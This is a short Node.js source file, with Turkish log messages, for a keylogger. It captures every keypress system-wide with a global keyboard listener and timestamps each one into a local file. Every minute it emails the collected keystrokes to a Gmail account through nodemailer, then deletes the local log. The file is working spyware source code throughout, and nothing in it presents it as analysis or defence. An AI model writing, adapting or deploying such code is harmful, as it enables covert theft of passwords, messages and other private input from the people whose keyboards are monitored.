require("dotenv").config();  
const { GlobalKeyboardListener } = require("node-global-key-listener");
const fs = require("fs");
const nodemailer = require("nodemailer");

const logFile = "logs.txt";
const emailInterval = 60000; 

const vKey = new GlobalKeyboardListener();


const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,  
        pass: process.env.EMAIL_PASS   
    }
});

vKey.addListener((e) => {
    if (e.state === "DOWN") {  
        const logEntry = `${new Date().toISOString()} - Key: ${e.name}\n`;
        fs.appendFileSync(logFile, logEntry);
        console.log(logEntry);
    }
});


function sendEmailLogs() {
    if (fs.existsSync(logFile)) {
        const logData = fs.readFileSync(logFile, "utf8");

        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: "🔑 Yeni Keylogger Logları",
            text: logData
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log("❌ E-posta gönderme başarısız: ", error);
            } else {
                console.log("✅ Loglar e-posta ile gönderildi: " + info.response);
                fs.unlinkSync(logFile); // Logları temizle
            }
        });
    }
}


setInterval(sendEmailLogs, emailInterval);

console.log("🎯 Keylogger çalışıyor... Loglar e-posta ile gönderilecek.");
